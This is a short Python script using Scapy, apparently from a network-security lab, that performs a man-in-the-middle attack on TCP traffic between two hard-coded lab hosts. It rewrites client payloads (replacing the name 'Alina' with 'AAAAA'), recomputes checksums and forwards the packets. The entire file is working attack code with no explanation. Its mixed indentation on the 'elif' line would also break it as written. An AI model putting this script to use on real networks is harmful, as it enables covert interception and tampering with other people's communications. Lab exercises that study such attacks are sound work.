#!/usr/bin/python3
from scapy.all import *
import re


# Define host IP and MAC addresses

client_ip = "10.0.2.10"
client_mac = "08:00:27:76:d6:32"

server_ip = "10.0.2.12"
server_mac = "08:00:27:eb:6e:8a"


def spoof_pkt(pkt):
    if pkt[IP].src == client_ip and pkt[IP].dst == server_ip and pkt[TCP].payload:
        original_pkt = (pkt[TCP].payload.load)
        data = original_pkt.decode()
        string = re.sub(r'Alina', 'A' * 5, data)
        new_pkt = pkt[IP]
        del(new_pkt.chksum)
        del(new_pkt[TCP].payload)
        del(new_pkt[TCP].chksum)
        new_pkt = new_pkt/string
        print("Data transformed from: "+str(original_pkt)+" to: "+ string)
        send(new_pkt, verbose = False)
	elif pkt[IP].src == server_ip and pkt[IP].dst == client_ip:
        new_pkt = pkt[IP]
        send(new_pkt, verbose = False)

pkt = sniff(filter='tcp',prn=spoof_pkt)